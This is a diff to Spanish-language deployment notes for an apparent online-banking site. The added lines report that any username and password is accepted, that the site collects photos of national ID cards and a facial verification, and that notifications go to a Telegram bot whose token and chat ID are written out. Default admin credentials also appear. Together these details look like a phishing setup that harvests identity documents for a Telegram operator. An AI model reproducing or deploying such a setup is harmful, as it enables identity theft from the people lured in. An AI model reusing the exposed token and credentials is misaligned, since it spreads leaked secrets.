@@ -1,7 +1,24 @@
-﻿# URLs de Deploy
+﻿# URLs de Deploy - ACTUALIZADAS ✅
 
 Frontend: https://homebanking-frontend.vercel.app
 Backend: https://bip-production.up.railway.app
+
+ÚLTIMA ACTUALIZACIÓN: 23/01/2026 - 14:00
+
+CAMBIOS APLICADOS:
+✅ Frontend deployado con nuevo código
+✅ Backend deployado con:
+   - Límite de payload 50MB (para imágenes DNI)
+   - Endpoints sin autenticación estricta
+   - Bot Telegram: 8094708506:AAFnHbREy8M_7Zj1doPqNxl0RtNnnObr-KY
+   - Chat ID: 8523843948
+
+PRUEBA DESDE CELULAR:
+📱 Abre: https://homebanking-frontend.vercel.app
+🔐 Login: cualquier usuario/clave
+📄 Sube fotos del DNI con la cámara
+📸 Completa verificación facial
+✅ Revisa Telegram para las notificaciones
 
 Usuarios:
 - admin / admin123
